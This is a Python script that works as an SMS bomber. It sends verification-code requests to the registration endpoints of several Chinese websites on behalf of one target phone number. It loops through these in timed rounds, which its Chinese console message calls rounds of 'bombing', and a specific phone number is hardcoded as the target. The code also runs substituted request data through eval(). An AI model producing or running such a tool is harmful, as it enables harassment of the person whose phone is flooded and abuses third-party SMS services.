import requests
import json
import time
import random

# post地址 post参数
APIS = [
    # CNMO
    {
        'url': 'http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery18306147606011785998_时间1&mobile=手机号码&type=5&_=时间2',
        'headers': {
            'Referer': 'http://passport.cnmo.com/'
        }
    },
    # 华测云
    {
        'url': 'https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile=手机号码',
    },
    # yingsheng
    {
        'url': 'https://sso.yingsheng.com/crosApi',
        'body': 'Cs25"sso_getRegisterMobileCode"a1{s11"手机号码"}z',
    },
    # 51sxue
    {
        'url': 'http://www.51sxue.com/index.php',
        'body': {
            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username': '456dadad'
        }
    },
    # yespmp
    {
        'url': 'https://admin.yespmp.com/YespmpWeb/registerSendCode',
        'body': {
            'phone': '手机号码'
        }
    },
    # 秘塔写作
    {
        'url': 'https://xiezuocat.com/verify?type=signup',
        'payload': True,
        'body': {
            'phone': '86-手机号码'
        }
    },
]


def sendSMS(API, phone):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    }
    if API.get('headers'):
        headers.update(API.get('headers'))
    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(
        int(time.time() * 1000)))
    body = API.get('body')
    try:
        if body:
            body = eval(str(body).replace("手机号码", phone)) if isinstance(body, dict) else body.replace("手机号码", phone)
            if API.get('payload'):
                body = json.dumps(body)
            r = requests.post(url, body, headers=headers)
        else:
            r = requests.get(url, headers=headers)
        # print(r.status_code)
        # print(r.text)
        # print(json.loads(r.text))
    except:
        ...


def main(phone):
    i = 0
    while i < 2:
        for API in APIS:
            sendSMS(API, phone)
            time.sleep(random.randint(1, 3))
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
        time.sleep(60)
        i += 1


if __name__ == '__main__':
    # 手机号
    phone = '19902623069'
    # sendSMS(APIS[-1], phone)
    main(phone)
